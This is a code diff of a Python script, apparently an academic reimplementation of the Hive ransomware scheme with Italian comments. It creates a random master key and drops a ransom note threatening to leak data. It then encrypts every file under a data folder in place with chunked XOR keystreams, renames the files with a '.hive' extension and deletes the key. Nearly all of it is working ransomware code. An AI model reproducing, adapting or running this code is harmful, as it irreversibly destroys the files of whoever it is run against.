@@ -1,19 +1,43 @@
 import os
+import gc
+import Crypto
+from Crypto.Cipher import PKCS1_OAEP
+from Crypto.PublicKey import RSA
+import hashlib
+from base64 import urlsafe_b64encode, urlsafe_b64decode
 
-# Write the random bytes to a file
-def create_masterkey():
-    file_size = 10 * 1024 * 1024 # Set the file size (in bytes)
-    with open('masterkey.bin', 'wb') as f:
-        f.write(os.urandom(file_size))
+def base64UrlEncode(data):
+    return urlsafe_b64encode(data).rstrip(b'=')
 
-def open_masterkey():
-    with open('masterkey.bin','rb') as f:
+def base64UrlDecode(base64Url):
+    padding = b'=' * (4 - (len(base64Url) % 4))
+    return urlsafe_b64decode(base64Url + padding)
+
+def create_masterkey(cipher):
+    file_size = 10 * 1024 * 1024 # Dimensione 10 MiB
+    ciphertext = os.urandom(file_size) #int_key = int.from_bytes(os.urandom(file_size), byteorder='big') 
+    #print(type(ciphertext))
+    #ciphertext = cipher.encrypt(str(int_key))
+
+    print(hashlib.md5(ciphertext).digest())
+    print(bytes(base64UrlEncode(hashlib.md5(ciphertext).digest())))
+
+    mkey_name = bytes(base64UrlEncode(hashlib.md5(ciphertext).digest())).decode('utf-8') + '.key.hive' #baseurl64(MD5(encrypted_masterkey)).key.hive
+
+    with open(mkey_name, 'wb') as f:
+        f.write(ciphertext)
+    gc.collect()
+    return mkey_name
+
+def open_masterkey(key_name):
+    with open(key_name,'rb') as f:
         return f.read()
 
 def create_ransomnote():
-    note = "This is a ransom note."
-    with open('ransom_note.txt','w') as f:
+    note = "Il tuo sistema e' stato compromesso. Paga il riscatto o i tuoi dati saranno pubblicati sul nostro sito."
+    with open('nota_di_riscatto.txt','w') as f:
         f.write(note)
+    gc.collect()
 
 def take_keystream(mkey,offset,size):
     return mkey[offset:offset+size]
@@ -41,12 +65,14 @@ def NBS_size_calc(FS):
     else:
         NBS = (FS-(T<<12))/(T-1)
     print("NBS = ", NBS)
+    gc.collect()
     return NBS       
 
 def create_EKS(ks1,ks2):
     EKS = bytearray(0xFFFFF)
     for i in range(0,0xFFFFF):
         EKS[i] = ks1[i] ^ ks2[i%0x400]
+    gc.collect()
     return EKS
 
 def full_encrypting(file, ks1, ks2):
@@ -60,14 +86,8 @@ def full_encrypting(file, ks1, ks2):
         
     for i in range(0,file_stats.st_size):
         encrypted_file[i] = fileinbytes[i] ^ EKS[i%0x100000]
-
+    gc.collect()
     return encrypted_file
-
-#def encrypt_chunk(f, file, EKS, start, end):
-#    for i in range(start, end):
-#        f[i] = file[i] ^ EKS[i%0x100000]
-#    return f[i]
-    
 
 def chunk_encrypting(file, ks1, ks2, NBS):
     file_stats = os.stat(file)
@@ -104,54 +124,115 @@ def chunk_encrypting(file, ks1, ks2, NBS):
     
     for c in chunks:
         if c[0]:
-            #print(c)
-            #encrypted_file.extend(list(map(use_chunk,file,c,EKS)))
             arr = []
             for i in range(c[2],c[3]):
                 arr.append(fileinbytes[i]^EKS[i%0x100000])
             encrypted_file.extend(arr)
         else:
             encrypted_file.extend(list(c[1]))
-
+    gc.collect()
     return encrypted_file
 
 
+def list_files(dir):
+    # Create an empty list to store the paths of all files in all subdirectories
+    file_paths = []
 
-
-    #encrypt_block = True
-    #current = 0
-    #encrypt_block = 0x1000
-    #while current < file_stats.st_size:
-    #    if encrypt_block:
-    #        encrypt_block = False
-    #        encrypted_file += encrypt_chunk(encrypted_file, fileinbytes, EKS,
-    #         current, current+encrypt_block)
-    #        current = current + 0x1000
-    #    else:
-    #        encrypt_block = True
-    #        encrypted_file += fileinbytes[current:current+NBS]
-    #        current += NBS
-
-
-    #return encrypted_file
-
-
-#Fase 1: creazione della master key
-create_masterkey()
-#Fase 2: creazione del messaggio di riscatto
-create_ransomnote()
+    # Walk through all subdirectories and append the path of every file to file_paths
+    for root, directories, files in os.walk(dir):
+        for filename in files:
+            # Join the root path and the filename to create the full file path
+            filepath = os.path.join(root, filename)
+            file_paths.append(filepath)
+    gc.collect()
+    return file_paths
 
 #Fase 3: generazione keystream
-R1 = int.from_bytes(os.urandom(8),"big")
-R2 = int.from_bytes(os.urandom(8),"big")
-keystream1 = bytearray(take_keystream(open_masterkey(), R1 % 0x900000, 1024*1024)) #Prendiamo un numero casuale di 8 byte, facciamo un'operazione di modulo con il valore 0x900000 e prendiamo da questo offset nella nostra masterkey una porzione di 1MiB.
-keystream2 = bytearray(take_keystream(open_masterkey(), R2 % 0x9FFC00, 1024)) #stessa cosa di prima ma l'offset è diverso e prendiamo 1KiB
 
 #encrypted_lorem = full_encrypting('./lorem.txt', keystream1, keystream2)
-file = './data/lorem.txt'
-print("file_size = ", os.stat(file).st_size)
-encrypted_lorem = chunk_encrypting(file, keystream1, keystream2, NBS_size_calc(os.stat(file).st_size))
-with open('lorem_encrypted_chunks.txt','wb') as f:
-    f.write(bytearray(encrypted_lorem))
 
-#TODO encrypt all files in ./data/
+def str_bitwiseor(a,b):
+    if (len(a) > len(b)):
+        while(len(b) < len(a)):
+            b = '0' + b
+    else:
+        while(len(a) < len(b)):
+            a = '0' + a
+    s = ""
+    for i in range(0,len(a)):
+        #print(a[i]+" | "+b[i] +" = ",str(int(a[i]) | int(b[i])))
+        s = s + str(int(a[i])|int(b[i]))
+    return s
+
+def split_into_eight(string):
+    length = len(string)
+    num_blocks = length // 8
+    blocks = []
+    for i in range(num_blocks):
+        start = i * 8
+        end = start + 8
+        blocks.append(string[start:end])
+
+    if length % 8 > 0:
+        blocks.append(string[num_blocks*8:])
+
+    return blocks
+
+
+def hive_ransomware():
+    key_pair = RSA.generate(2048)
+
+    RSA_public_key = key_pair.publickey().exportKey()
+    RSA_private_key = key_pair.exportKey()
+    cipher = PKCS1_OAEP.new(RSA_public_key)
+
+    #Fase 1: creazione della master key
+    key_name = create_masterkey(cipher)
+    #Fase 2: creazione del messaggio di riscatto
+    create_ransomnote()
+    root = "./data"
+    for file in list_files(root):
+        print("file_name = ", os.path.join(root, file))
+        print("file_size = ", os.stat(file).st_size)
+
+        R1 = int.from_bytes(os.urandom(8),"little")
+        R2 = int.from_bytes(os.urandom(8),"little")
+        keystream1 = bytearray(take_keystream(open_masterkey(key_name), R1 % 0x900000, 1024*1024)) #Prendiamo un numero casuale di 8 byte, facciamo un'operazione di modulo con il valore 0x900000 e prendiamo da questo offset nella nostra masterkey una porzione di 1MiB.
+        keystream2 = bytearray(take_keystream(open_masterkey(key_name), R2 % 0x9FFC00, 1024)) #stessa cosa di prima ma l'offset è diverso e prendiamo 1KiB
+
+        encrypted_file = chunk_encrypting(file, keystream1, keystream2, NBS_size_calc(os.stat(file).st_size))
+        with open(file,'wb') as f:
+            f.write(bytearray(encrypted_file))
+
+        file_path = os.path.join("", file)
+
+        gc.collect()
+        R1_bin = str(bin(R1))[2:]
+        R2_bin = str(bin(R2))[2:]
+        digest_bin = str(bin(int(hashlib.md5(open_masterkey(key_name)).hexdigest(), base=16)))[2:]
+        
+        bit_or_R1_R2 = str_bitwiseor(R1_bin,R2_bin)
+        full_bit_or = str_bitwiseor(bit_or_R1_R2,digest_bin)
+        #while (len(full_bit_or) % 8 != 0):
+        #    full_bit_or = '0' + full_bit_or
+        #blocks = split_into_eight(full_bit_or)
+        #print(blocks)
+
+        new_name = file + "." + str(base64UrlEncode(bytes(str(hex(int(full_bit_or,2))), encoding='utf-8')).decode('utf-8')) + ".hive"
+        new_path = os.path.join("", new_name)
+        print(new_path)
+        os.rename(file_path, new_path)
+    cleanup(key_name)
+
+def cleanup(key_name):
+
+    entries = os.scandir("./")
+
+    files = [entry for entry in entries if entry.is_file() and entry.name == key_name]
+
+    for file in files:
+        os.remove(file.path)
+    gc.collect()
+
+if __name__ == '__main__':
+    hive_ransomware()
